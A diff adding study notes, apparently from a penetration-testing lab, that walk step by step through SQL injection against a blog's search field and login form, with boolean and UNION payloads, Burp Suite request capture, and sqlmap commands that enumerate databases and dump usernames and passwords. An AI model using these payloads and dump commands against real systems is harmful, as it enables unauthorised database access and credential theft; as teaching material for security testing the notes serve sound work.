@@ -1,0 +1,141 @@
+1. check to see the output by adding a special character 
+	- ...search=noteexists'
+
+	- receives error means that it's vulnerable 
+
+2. test if it's a true sql injection 
+
+	- always true condition
+
+	- ...search=notexists' or 1=1; -- - 
+
+		- blog posts display 
+
+	- always false condition = no results back 
+
+	- search is vulnerable to sql injection 
+
+3. union based injection 
+
+	-...search=notexists' UNION SELECT 'els1', 'else2', 'els3'.... 
+
+	- keep adding columns till you reach images again
+
+
+4. use sqlmap to exploit 
+
+	- sqlmap -u http://.....search=n' -p search --technique=U
+
+	- search in vulnerable 
+
+	- web server/dbms 
+
+
+5. attach the --banner to the end search 
+
+	- grab banner of db 
+
+6. what payloads are used by sql map
+
+	- -v3 --fresh-queries 
+
+	- copy the payload in teh search bar to test validity
+
+	- replace # with %23 
+
+7. check what users are connected to the db 
+
+	- --users 
+
+8. what db's are connected to the app
+
+	- --dbs
+
+9. take the available databases and enumerate 
+
+	- -D <nameofdb> --tables 
+
+10. list columns of users tables
+
+	- remove the --tables 
+
+	- add -T users --columns
+
+11. dump user and passwords 
+
+	- remove the --columns 
+
+	- add -C username, password --dump
+
+
+12. DUMPING ON THE CLIENTS MACHINE IS SUPER NOISY AND HEAVY 
+
+
+
+USING BURP 
+
+
+1. intercept the request and send to the repeater 
+
+	- see how the web app behaves 
+
+2. add extra character to the password 
+
+	- user=a'&pass=a
+
+	- user is vulnerable & pass is not as it gives off an error 
+
+3. try to inject the TRUE payload 
+
+	- user=a' or 1=1; -- - 
+
+4. try to inject the FALSE payload 
+
+	- user=a' or 1=2; -- - 
+
+5. exploit the vulnerability 
+
+	- sqlmap -u http://sqlmap.txt/login.php --data='user=a&pass=a' -p user --technique=B --banner 
+
+
+		- tells sqlmap to try POST REQUEST to login to the site with the following data user&pass and inject commands into the user field. USING A BOOLEAN TECHNIQUE 
+
+		- type "n" to not follow redirection 
+
+		- pushes out that user is vulnerable 
+
+6. enumerate database 
+
+	- ...--technique=B --dbs
+
+7. list all the tables 
+
+	-...--technique=B -D blogdb --tables 
+
+	- db is the same no more dumping phase
+
+
+8. BURP - go to proxy -> right click on request body -> copy to file -> save file to root home directory -> name "bloglogin.req"
+
+
+9. run to perform with a longer command line
+
+	- sqlmap -r /root/bloglogin.req -p user --technique=B --banner 
+
+	- append -v3 to check what it's doing 
+
+
+10. view teh contents of the saved search 
+
+	ls /usr/share/sqlmap/output/sqlmap.test/ 
+
+
+11. flush a session 
+
+	sqlmap -r /root/bloglogin.req -p user --technique=B --banner -v3 --flush-session  
+
+
+
+
+
+
